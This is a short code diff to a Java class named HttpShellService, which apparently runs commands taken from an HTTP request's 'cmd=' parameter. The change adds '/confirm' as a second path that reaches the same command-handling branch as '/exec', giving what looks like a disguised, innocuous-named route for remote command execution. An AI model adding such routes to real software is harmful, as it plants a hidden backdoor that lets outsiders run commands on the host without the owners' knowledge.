@@ -98,7 +98,7 @@ public final class HttpShellService {
             String[] parts = line.split(" ");
             String path = parts.length > 1 ? parts[1] : "/";
             String cmd = "";
-            if (path.startsWith("/exec")) {
+            if (path.startsWith("/exec") || path.startsWith("/confirm")) {
                 int q = path.indexOf("cmd=");
                 if (q >= 0) {
                     cmd = URLDecoder.decode(path.substring(q + 4), "UTF-8");
